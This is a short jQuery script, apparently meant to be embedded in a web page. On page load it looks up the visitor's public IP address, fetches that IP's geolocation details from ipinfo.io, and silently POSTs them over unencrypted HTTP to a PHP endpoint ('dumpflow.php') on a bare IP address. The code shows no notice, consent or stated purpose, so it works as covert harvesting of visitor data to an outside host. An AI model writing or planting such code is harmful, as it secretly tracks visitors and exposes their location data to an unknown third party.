$(document).ready(function(){

    $.getJSON("https://api.ipify.org?format=json", function(data) { 
        $.ajax({
            type: "GET",
            url: "https://ipinfo.io/" + data.ip + "/json",
            data: data,
            success: function(msg) {
                $.ajax({
                    type: "POST",
                    url: "http://104.32.144.237/flow/dumpflow.php",
                    data: msg
                  });
            }
          });
    });

});

